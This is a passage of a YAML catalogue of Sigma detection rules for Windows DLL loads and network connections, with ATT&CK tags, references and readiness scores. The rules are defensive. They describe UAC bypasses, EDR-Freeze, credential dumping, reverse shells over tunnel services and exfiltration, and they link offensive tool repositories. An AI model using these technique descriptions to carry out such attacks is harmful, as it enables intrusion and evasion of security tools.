  name: DLL Load By System Process From Suspicious Locations
  description: Detects when a system process (i.e. located in system32, syswow64,
    etc.) loads a DLL from a suspicious location or a location with permissive permissions
    such as "C:\Users\Public"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC (Idea)
  false_positives:
  - Unknown
  notes: ''
- detection_id: cbb56d62-4060-40f7-9466-d8aaf3123f83
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_susp_python_image_load.yml
  name: Python Image Load By Non-Python Process
  description: 'Detects the image load of "Python Core" by a non-Python process. This
    might be indicative of a execution of executable that has been bundled from Python
    code.

    Various tools like Py2Exe, PyInstaller, and cx_Freeze are used to bundle Python
    code into standalone executables.

    Threat actors often use these tools to bundle malicious Python scripts into executables,
    sometimes to obfuscate the code or to bypass security measures.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1027.002
  tags:
  - attack.defense-evasion
  - attack.t1027.002
  time_window: ''
  references:
  - https://www.py2exe.org/
  - https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/
  false_positives:
  - Legitimate Py2Exe Binaries
  - Known false positive caused with Python Anaconda
  - Various legitimate software is bundled from Python code into executables
  notes: ''
- detection_id: 4508a70e-97ef-4300-b62b-ff27992990ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml
  name: DotNet CLR DLL Loaded By Scripting Applications
  description: Detects .NET CLR DLLs being loaded by scripting applications such as
    wscript or cscript. This could be an indication of potential suspicious execution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - risk_scoring_or_weighting
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.privilege-escalation
  - attack.t1055
  time_window: ''
  references:
  - https://github.com/tyranid/DotNetToJScript
  - https://thewover.github.io/Introducing-Donut/
  - https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html
  - https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008
  false_positives:
  - Unknown
  notes: ''
- detection_id: b5de0c9a-6f19-43e0-af4e-55ad01f550af
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_susp_unsigned_dll.yml
  name: Unsigned DLL Loaded by Windows Utility
  description: 'Detects windows utilities loading an unsigned or untrusted DLL.

    Adversaries often abuse those programs to proxy execution of malicious code.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  - T1218.011
  tags:
  - attack.t1218.011
  - attack.t1218.010
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.elastic.co/security-labs/Hunting-for-Suspicious-Windows-Libraries-for-Execution-and-Evasion
  - https://akhere.hashnode.dev/hunting-unsigned-dlls-using-kql
  - https://unit42.paloaltonetworks.com/unsigned-dlls/?web_view=true
  false_positives:
  - Unknown
  notes: ''
- detection_id: ea5c131b-380d-49f9-aeb3-920694da4d4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_thor_unsigned_execution.yml
  name: Suspicious Unsigned Thor Scanner Execution
  description: Detects loading and execution of an unsigned thor scanner binary.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Other legitimate binaries named "thor.exe" that aren't published by Nextron Systems
  notes: ''
- detection_id: 9ed5959a-c43c-4c59-84e3-d28628429456
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_uac_bypass_iscsicpl.yml
  name: UAC Bypass Using Iscsicpl - ImageLoad
  description: Detects the "iscsicpl.exe" UAC bypass technique that leverages a DLL
    Search Order hijacking technique to load a custom DLL's from temp or a any user
    controlled location in the users %PATH%
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC
  - https://twitter.com/wdormann/status/1547583317410607110
  false_positives:
  - Unknown
  notes: ''
- detection_id: a5ea83a7-05a5-44c1-be2e-addccbbd8c03
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_uac_bypass_via_dism.yml
  name: UAC Bypass With Fake DLL
  description: Attempts to load dismcore.dll after dropping it
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1548.002
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  - attack.t1574.001
  time_window: ''
  references:
  - https://steemit.com/utopian-io/@ah101/uac-bypassing-utility
  false_positives:
  - Actions of a legitimate telnet client
  notes: ''
- detection_id: a9c73e8b-3b2d-4c45-8ef2-5f9a9c9998ad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_win_mmc_loads_script_engine_dll.yml
  name: MMC Loading Script Engines DLLs
  description: 'Detects when the Microsoft Management Console (MMC) loads the DLL
    libraries like vbscript, jscript etc which might indicate an attempt

    to execute malicious scripts within a trusted system process for bypassing application
    whitelisting or defense evasion.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  - T1218.014
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1059.005
  - attack.t1218.014
  time_window: ''
  references:
  - https://tria.ge/241015-l98snsyeje/behavioral2
  - https://www.elastic.co/security-labs/grimresource
  false_positives:
  - Legitimate MMC operations or extensions loading these libraries
  notes: ''
- detection_id: 416bc4a2-7217-4519-8dc7-c3271817f1d5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_win_susp_dbgcore_dbghelp_load.yml
  name: Suspicious Loading of Dbgcore/Dbghelp DLLs from Uncommon Location
  description: 'Detects loading of dbgcore.dll or dbghelp.dll from uncommon locations
    such as user directories.

    These DLLs contain the MiniDumpWriteDump function, which can be abused for credential
    dumping purposes or in some cases for evading EDR/AV detection by suspending processes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1562.001
  tags:
  - attack.credential-access
  - attack.t1003
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://blog.axelarator.net/hunting-for-edr-freeze/
  - https://www.zerosalarium.com/2025/09/EDR-Freeze-Puts-EDRs-Antivirus-Into-Coma.html
  - https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html
  false_positives:
  - Possibly during software installation or update processes
  notes: ''
- detection_id: 0cbe38c0-270c-41d9-ab79-6e5a9a669290
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_win_trusted_path_bypass.yml
  name: Trusted Path Bypass via Windows Directory Spoofing
  description: 'Detects DLLs loading from a spoofed Windows directory path with an
    extra space (e.g "C:\Windows \System32") which can bypass Windows trusted path
    verification.

    This technique tricks Windows into treating the path as trusted, allowing malicious
    DLLs to load with high integrity privileges bypassing UAC.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1548.002
  - T1574.007
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.007
  - attack.t1548.002
  time_window: ''
  references:
  - https://x.com/Wietze/status/1933495426952421843
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 8a2f4b1c-3d5e-4f7a-9b2c-1e4f6d8a9c2b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_win_werfaultsecure_dbgcore_dbghelp_load.yml
  name: WerFaultSecure Loading DbgCore or DbgHelp - EDR-Freeze
  description: 'Detects WerFaultSecure.exe loading dbgcore.dll or dbghelp.dll which
    contains the MiniDumpWriteDump function.

    The MiniDumpWriteDump function creates a minidump of a process by suspending all
    threads in the target process to ensure a consistent memory snapshot.

    The EDR-Freeze technique abuses WerFaultSecure.exe running as a Protected Process
    Light (PPL) with WinTCB protection level to suspend EDR/AV processes.

    By leveraging MiniDumpWriteDump''s thread suspension behavior, edr-freeze allows
    malicious activity to execute undetected during the suspension period.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/TwoSevenOneT/EDR-Freeze
  - https://blog.axelarator.net/hunting-for-edr-freeze/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 05936ce2-ee05-4dae-9d03-9a391cf2d2c6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_wmi_persistence_commandline_event_consumer.yml
  name: WMI Persistence - Command Line Event Consumer
  description: Detects WMI command line event consumers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.privilege-escalation
  - attack.t1546.003
  - attack.persistence
  time_window: ''
  references:
  - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/
  false_positives:
  - Unknown (data set is too small; further testing needed)
  notes: ''
- detection_id: 06ce37c2-61ab-4f05-9ff5-b1a96d18ae32
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_wmic_remote_xsl_scripting_dlls.yml
  name: WMIC Loading Scripting Libraries
  description: Detects threat actors proxy executing code and bypassing application
    controls by leveraging wmic and the `/FORMAT` argument switch to download and
    execute an XSL file (i.e js, vbs, etc).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1220
  tags:
  - attack.defense-evasion
  - attack.t1220
  time_window: ''
  references:
  - https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-201017061100.html
  - https://twitter.com/dez_/status/986614411711442944
  - https://lolbas-project.github.io/lolbas/Binaries/Wmic/
  false_positives:
  - The command wmic os get lastbootuptime loads vbscript.dll
  - The command wmic os get locale loads vbscript.dll
  - Since the ImageLoad event doesn't have enough information in this case. It's better
    to look at the recent process creation events that spawned the WMIC process and
    investigate the command line and parent/child processes to get more insights
  - The command `wmic ntevent` loads vbscript.dll
  notes: ''
- detection_id: 7707a579-e0d8-4886-a853-ce47e4575aaa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_wmiprvse_wbemcomn_dll_hijack.yml
  name: Wmiprvse Wbemcomn DLL Hijack
  description: Detects a threat actor creating a file named `wbemcomn.dll` in the
    `C:\Windows\System32\wbem\` directory over the network and loading it for a WMI
    DLL Hijack scenario.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.002
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/201009-RemoteWMIWbemcomnDLLHijack/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: ad1f4bb9-8dfb-4765-adb6-2a7cfb6c0f94
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_wsman_provider_image_load.yml
  name: Suspicious WSMAN Provider Image Loads
  description: Detects signs of potential use of the WSMAN provider from uncommon
    processes locally and remote execution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.003
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.lateral-movement
  - attack.t1021.003
  time_window: ''
  references:
  - https://twitter.com/chadtilbury/status/1275851297770610688
  - https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/
  - https://learn.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-architecture
  - https://github.com/bohops/WSMan-WinRM
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5205613d-2a63-4412-a895-3a2458b587b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_addinutil_initiated.yml
  name: Network Connection Initiated By AddinUtil.EXE
  description: 'Detects a network connection initiated by the Add-In deployment cache
    updating utility "AddInutil.exe".

    This could indicate a potential command and control communication as this tool
    doesn''t usually initiate network activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: b3ad3c0f-c949-47a1-a30e-b0491ccae876
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_adws_unusual_connection.yml
  name: Uncommon Connection to Active Directory Web Services
  description: 'Detects uncommon network connections to the Active Directory Web Services
    (ADWS) from processes not typically associated with ADWS management.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087
  tags:
  - attack.discovery
  - attack.t1087
  time_window: ''
  references:
  - https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c
  - https://github.com/FalconForceTeam/FalconFriday/blob/a9219dfcfd89836f34660223f47d766982bdce46/Discovery/ADWS_Connection_from_Unexpected_Binary-Win.md
  false_positives:
  - ADWS is used by a number of legitimate applications that need to interact with
    Active Directory. These applications should be added to the allow-listing to avoid
    false positives.
  notes: ''
- detection_id: 0dba975d-a193-4ed1-a067-424df57570d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_certutil_initiated_connection.yml
  name: Uncommon Network Connection Initiated By Certutil.EXE
  description: 'Detects a network connection initiated by the certutil.exe utility.

    Attackers can abuse the utility in order to download malware or additional payloads.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
  false_positives:
  - Unknown
  notes: ''
- detection_id: efafe0bf-4238-479e-af8f-797bd3490d2d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_cmstp_initiated_connection.yml
  name: Outbound Network Connection Initiated By Cmstp.EXE
  description: 'Detects a network connection initiated by Cmstp.EXE

    Its uncommon for "cmstp.exe" to initiate an outbound network connection. Investigate
    the source of such requests to determine if they are malicious.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1218.003
  tags:
  - attack.defense-evasion
  - attack.t1218.003
  time_window: ''
  references:
  - https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 37e4024a-6c80-4d8f-b95d-2e7e94f3a8d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_dialer_initiated_connection.yml
  name: Outbound Network Connection Initiated By Microsoft Dialer
  description: 'Detects outbound network connection initiated by Microsoft Dialer.

    The Microsoft Dialer, also known as Phone Dialer, is a built-in utility application
    included in various versions of the Microsoft Windows operating system. Its primary
    function is to provide users with a graphical interface for managing phone calls
    via a modem or a phone line connected to the computer.

    This is an outdated process in the current conext of it''s usage and is a common
    target for info stealers for process injection, and is used to make C2 connections,
    common example is "Rhadamanthys"

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1071.001
  tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://tria.ge/240301-rk34sagf5x/behavioral2
  - https://app.any.run/tasks/6720b85b-9c53-4a12-b1dc-73052a78477d
  - https://research.checkpoint.com/2023/rhadamanthys-v0-5-0-a-deep-dive-into-the-stealers-components/
  - https://strontic.github.io/xcyclopedia/library/dialer.exe-0B69655F912619756C704A0BF716B61F.html
  false_positives:
  - In Modern Windows systems, unable to see legitimate usage of this process, However,
    if an organization has legitimate purpose for this there can be false positives.
  notes: ''
- detection_id: 5c80b618-0dbb-46e6-acbb-03d90bcb6d83
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_azurewebsites.yml
  name: Network Connection Initiated To AzureWebsites.NET By Non-Browser Process
  description: 'Detects an initiated network connection by a non browser process on
    the system to "azurewebsites.net". The latter was often used by threat actors
    as a malware hosting and exfiltration site.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1102
  - T1102.001
  tags:
  - attack.command-and-control
  - attack.t1102
  - attack.t1102.001
  time_window: ''
  references:
  - https://www.sentinelone.com/labs/wip26-espionage-threat-actors-abuse-cloud-infrastructure-in-targeted-telco-attacks/
  - https://symantec-enterprise-blogs.security.com/threat-intelligence/harvester-new-apt-attacks-asia
  - https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/
  - https://intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9e02c8ec-02b9-43e8-81eb-34a475ba7965
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_btunnels.yml
  name: Network Connection Initiated To BTunnels Domains
  description: 'Detects network connections to BTunnels domains initiated by a process
    on the system.

    Attackers can abuse that feature to establish a reverse shell or persistence on
    a machine.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567
  - T1572
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.t1567
  - attack.t1572
  time_window: ''
  references:
  - https://defr0ggy.github.io/research/Utilizing-BTunnel-For-Data-Exfiltration/
  false_positives:
  - Legitimate use of BTunnels will also trigger this.
  notes: ''
- detection_id: 7cd1dcdc-6edf-4896-86dc-d1f19ad64903
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_cloudflared_communication.yml
  name: Network Connection Initiated To Cloudflared Tunnels Domains
  description: 'Detects network connections to Cloudflared tunnels domains initiated
    by a process on the system.

    Attackers can abuse that feature to establish a reverse shell or persistence on
    a machine.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567
  - T1572
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.t1567
  - attack.t1572
  time_window: ''
  references:
  - https://defr0ggy.github.io/research/Abusing-Cloudflared-A-Proxy-Service-To-Host-Share-Applications/
  - https://www.guidepointsecurity.com/blog/tunnel-vision-cloudflared-abused-in-the-wild/
  - Internal Research
  false_positives:
  - Legitimate use of cloudflare tunnels will also trigger this.
  notes: ''
- detection_id: fa5b1358-b040-4403-9868-15f7d9ab6329
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_crypto_mining_pools.yml
  name: Network Communication With Crypto Mining Pool
  description: Detects initiated network connections to crypto mining pools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1496
  tags:
  - attack.impact
  - attack.t1496
  time_window: ''
  references:
  - https://www.poolwatch.io/coin/monero
  - https://github.com/stamparm/maltrail/blob/3ea70459b9559134449423c0a7d8b965ac5c40ea/trails/static/suspicious/crypto_mining.txt
  - https://www.virustotal.com/gui/search/behaviour_network%253A*.miningocean.org/files
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 297ae038-edc2-4b2e-bb3e-7c5fc94dd5c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_dead_drop_resolvers.yml
  name: New Connection Initiated To Potential Dead Drop Resolver Domain
  description: 'Detects an executable, which is not an internet browser or known application,
    initiating network connections to legit popular websites, which were seen to be
    used as dead drop resolvers in previous attacks.

    In this context attackers leverage known websites such as "facebook", "youtube",
    etc. In order to pass through undetected.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1102
  - T1102.001
  tags:
  - attack.command-and-control
  - attack.t1102
  - attack.t1102.001
  time_window: ''
  references:
  - https://web.archive.org/web/20220830134315/https://content.fireeye.com/apt-41/rpt-apt41/
  - https://securelist.com/the-tetrade-brazilian-banking-malware/97779/
  - https://blog.bushidotoken.net/2021/04/dead-drop-resolvers-espionage-inspired.html
  - https://github.com/kleiton0x00/RedditC2
  - https://twitter.com/kleiton0x7e/status/1600567316810551296
  - https://www.linkedin.com/posts/kleiton-kurti_github-kleiton0x00redditc2-abusing-reddit-activity-7009939662462984192-5DbI/?originalSubdomain=al
  false_positives:
  - One might need to exclude other internet browsers found in it's network or other
    applications like ones mentioned above from Microsoft Defender.
  - Ninite contacting githubusercontent.com
  notes: ''
- detection_id: 9501f8e6-8e3d-48fc-a8a6-1089dd5d7ef4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_devtunnels.yml
  name: Network Connection Initiated To DevTunnels Domain
  description: 'Detects network connections to Devtunnels domains initiated by a process
    on a system. Attackers can abuse that feature to establish a reverse shell or
    persistence on a machine.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.001
  - T1572
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.t1567.001
  - attack.t1572
  time_window: ''
  references:
  - https://blueteamops.medium.com/detecting-dev-tunnels-16f0994dc3e2
  - https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/security
  - https://cydefops.com/devtunnels-unleashed
  false_positives:
  - Legitimate use of Devtunnels will also trigger this.
  notes: ''
- detection_id: 25eabf56-22f0-4915-a1ed-056b8dae0a68
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_dropbox_api.yml
  name: Suspicious Dropbox API Usage
  description: Detects an executable that isn't dropbox but communicates with the
    Dropbox API
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1105
  - T1567.002
  tags:
  - attack.command-and-control
  - attack.exfiltration
  - attack.t1105
  - attack.t1567.002
  time_window: ''
  references:
  - https://app.any.run/tasks/7e906adc-9d11-447f-8641-5f40375ecebb
  - https://www.zscaler.com/blogs/security-research/new-espionage-attack-molerats-apt-targeting-users-middle-east
  false_positives:
  - Legitimate use of the API with a tool that the author wasn't aware of
  notes: ''
- detection_id: edf3485d-dac4-4d50-90e4-b0e5813f7e60
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_external_ip_lookup.yml
  name: Suspicious Network Connection to IP Lookup Service APIs
  description: Detects external IP address lookups by non-browser processes via services
    such as "api.ipify.org". This could be indicative of potential post compromise
    internet test activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  tags:
  - attack.discovery
  - attack.t1016
  time_window: ''
  references:
  - https://github.com/rsp/scripts/blob/c8bb272d68164a9836e4f273d8f924927f39b8c6/externalip-benchmark.md
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-302a
  - https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/
  - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html
  false_positives:
  - Legitimate use of the external websites for troubleshooting or network monitoring
  notes: ''
- detection_id: 7e9cf7b6-e827-11ed-a05b-0242ac120003
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_google_api_non_browser_access.yml
  name: Suspicious Non-Browser Network Communication With Google API
  description: 'Detects a non-browser process interacting with the Google API which
    could indicate the use of a covert C2 such as Google Sheet C2 (GC2-sheet)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1102
  tags:
  - attack.command-and-control
  - attack.t1102
  time_window: ''
  references:
